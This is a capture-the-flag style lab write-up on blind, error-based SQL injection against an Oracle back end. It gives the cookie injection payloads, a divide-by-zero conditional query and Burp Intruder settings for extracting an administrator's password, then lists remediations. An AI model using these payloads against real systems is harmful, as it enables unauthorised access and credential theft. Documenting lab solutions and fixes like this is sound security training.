#  Lab: Blind SQL Injection with Conditional Errors

| **Category** | Web Security / SQL Injection |
| :--- | :--- |
| **Vulnerability Type** | Blind SQLi (Error-Based) |
| **Database** | Oracle |
| **Tools Used** | Burp Suite Professional (Repeater & Intruder) |
| **Status** | ✅ Solved |

---

## Conceptual Overview

**Blind SQL Injection** occurs when an application is vulnerable to SQL injection but its HTTP responses do not contain the results of the relevant SQL query or any details of any database errors.

In this specific **Error-Based** scenario, the application does not return different content (like a "Welcome" message) based on the query result. Instead, i force the database to generate a **Database Error (HTTP 500 Status)** when our condition is **TRUE**, and behave normally (HTTP 200 Status) when our condition is **FALSE**.

**The Logic:**
* **True Condition** $\rightarrow$ Trigger a math error (Divide by Zero) $\rightarrow$ **Server Crash (500 Error)**.
* **False Condition** $\rightarrow$ Do nothing $\rightarrow$ **Normal Response (200 OK)**.

---

##  Phase 1: Reconnaissance & Analysis

### 1. Detection (Triggering the Error)
i identified the `TrackingId` cookie as the injection point. By appending a single quote `'`, i disrupted the query syntax.
* **Payload:** `Cookie: TrackingId=xyz'`
* **Observation:** The server responded with `HTTP/1.1 500 Internal Server Error`.
* **Conclusion:** The input is being processed by the database, and error handling is not suppressing the crash.

### 2. Database Fingerprinting
To construct a working exploit, i needed to identify the database type. i tested Oracle-specific syntax (string concatenation using `||` and the `dual` table).

* **Payload:**
    ```sql
    '||(SELECT '' FROM dual)||'
    ```
* **Observation:** The server responded with `HTTP/1.1 200 OK`.
* **Result:** Confirmed the database is **Oracle**.

---

## ⚔️ Phase 2: Exploitation Strategy

Since i cannot see the data, i extract it character-by-character by asking the database "Yes/No" questions. i use the `CASE` statement to trigger a divide-by-zero error if the answer is "Yes".

### The logic vector:
```sql
SELECT CASE WHEN (YOUR_CONDITION) THEN TO_CHAR(1/0) ELSE '' END FROM dual
```
- If Condition is TRUE: The database attempts to calculate 1/0, causing a fatal error.

- If Condition is FALSE: The database executes ELSE '', resulting in valid SQL.

## Phase 3: Automation (Password Extraction)
I used Burp Intruder to brute-force the password character by character.

### 1. The Injection Payload
I injected the following query into the TrackingId cookie:

``` SQL
'||(SELECT CASE WHEN (SUBSTR(password,§1§,1)='§a§') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
### 2. Intruder Configuration (Cluster Bomb)
Attack Type: Cluster Bomb (Iterating through Position and Character simultaneously).

Payload Set 1 (Position): Numbers 1 to 20.

Payload Set 2 (Character): Simple List a-z, 0-9.

Critical Setting: Unchecked "URL-encode these characters" to prevent breaking the SQL syntax.

### 3. Analysis (Grep Match)
i configured Burp to flag responses containing:

String: Internal Server Error

Status Code: 500

### 4. Final Output
Any request that resulted in a 500 Error indicated that the guessed character at that specific position was correct.

Extracted Password: [Your_Extracted_Password_Here]

## Remediation
To fix this vulnerability, the following security practices must be implemented:

Parameterized Queries (Prepared Statements): Developers should use Prepared Statements (e.g., PreparedStatement in Java) to ensure user input is treated as data, not executable code. This prevents the interpreter from executing injected SQL commands.

Input Validation: Implement strict allow-listing for the TrackingId cookie. Ensure it only accepts alphanumeric characters and rejects special characters like ', |, or -.

Generic Error Handling: Configure the web server to return generic error messages. While this doesn't fix the injection, it prevents attackers from using verbose error messages for reconnaissance (though blind error-based attacks may still work).

Documentation by: *riyaz*